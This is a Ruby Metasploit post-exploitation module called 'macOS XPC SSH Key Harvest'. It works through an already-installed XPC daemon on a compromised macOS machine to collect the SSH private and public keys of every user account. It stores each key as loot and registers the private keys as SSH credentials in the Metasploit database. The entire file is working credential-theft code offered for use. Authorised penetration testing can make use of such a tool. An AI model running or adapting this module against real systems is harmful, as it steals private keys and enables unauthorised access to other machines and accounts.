##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC SSH Key Harvest',
        'Description'  => %q{
          Harvests SSH private and public keys from all user accounts on the macOS
          target via the XPC daemon. Each user's keys are stored as separate loot
          entries. Private keys are also reported as SSH credentials to the
          Metasploit database.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    print_status("Harvesting SSH keys via XPC daemon...")
    data = xpc_exec!('k3', timeout: 45)
    return if data.nil?

    total = 0

    users = data.is_a?(Hash) ? data : (data.is_a?(Array) ? data : [])

    if users.is_a?(Hash)
      users.each do |username, keys|
        store_user_keys(username, keys)
        total += 1
      end
    elsif users.is_a?(Array)
      users.each do |entry|
        next unless entry.is_a?(Hash)
        username = entry['user'] || entry['username'] || 'unknown'
        keys     = entry['keys'] || entry
        store_user_keys(username, keys)
        total += 1
      end
    end

    print_good("SSH keys harvested from #{total} user(s)")
  end

  private

  def store_user_keys(username, keys)
    key_data = keys.is_a?(Hash) ? keys : { 'raw' => keys.to_s }

    key_data.each do |filename, content|
      next if content.to_s.strip.empty?
      is_private = !filename.to_s.end_with?('.pub') && content.to_s.include?('PRIVATE KEY')

      loot_path = xpc_store_loot(
        "ssh_key.#{username}",
        content.to_s,
        "#{username}_#{filename}",
        "SSH key #{filename} for #{username}"
      )

      if is_private
        print_good("  [#{username}] Private key: #{filename}")
        credential_data = {
          origin_type: :session,
          session_id: session_db_id,
          post_reference_name: refname,
          private_type: :ssh_key,
          private_data: content.to_s,
          username: username,
          workspace_id: myworkspace_id
        }
        create_credential(credential_data)
      else
        print_status("  [#{username}] Public key: #{filename}")
      end
    end
  rescue => e
    print_warning("Error processing keys for #{username}: #{e.message}")
  end
end
